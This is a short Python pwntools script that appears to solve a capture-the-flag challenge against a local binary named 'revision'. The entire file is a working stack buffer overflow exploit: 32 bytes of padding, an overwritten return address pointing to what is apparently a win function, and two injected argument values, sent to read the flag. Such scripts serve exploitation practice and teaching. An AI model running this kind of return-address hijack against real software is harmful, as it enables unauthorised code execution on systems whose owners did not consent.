#!/usr/bin/env python3

from pwn import *

# Connect to the server
p = process("./revision")

# Read the introduction message
print(p.recv().decode())

# Build the payload
payload = b"a" * 32
payload += p32(0x080491b6)
payload += b"JUNK"
payload += p32(0xDEADBEEF)
payload += p32(0xCAFEBABE)

# Send the payload
p.sendline(payload)

# Read the response (the flag)
print(p.recv().decode())

p.interactive()
